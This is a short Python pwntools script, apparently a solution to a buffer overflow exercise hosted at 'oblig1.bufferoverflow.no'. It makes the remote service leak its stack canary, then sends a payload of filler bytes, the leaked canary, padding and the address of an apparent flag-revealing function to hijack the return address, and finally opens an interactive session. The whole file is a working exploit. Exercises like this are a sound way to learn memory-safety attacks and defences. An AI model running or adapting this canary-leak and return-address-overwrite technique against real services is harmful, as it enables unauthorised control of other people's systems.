import pwn

target = 'oblig1.bufferoverflow.no'
port = '7003'

canary_offset = b'24'
return_p_offset = b'B' * 8 * 1
integer_length = 4
bufferfill = b'A' * 24

expose_flag_adr = pwn.p64(0x4011a7)
p = pwn.remote(target, port)

print(b'1. ' + p.recvline())
p.send(canary_offset + b'\n')
print(b'2. ' + p.recvline())

read_canary = p.recvline().strip()
print(b'Read canary: ' + read_canary)
canary_val = pwn.p64(int(read_canary, 16))
print(b'Canary little_endian: ' + canary_val)

payload = bufferfill + canary_val + return_p_offset + expose_flag_adr

p.send(payload + b'\n')
p.interactive()

p.close()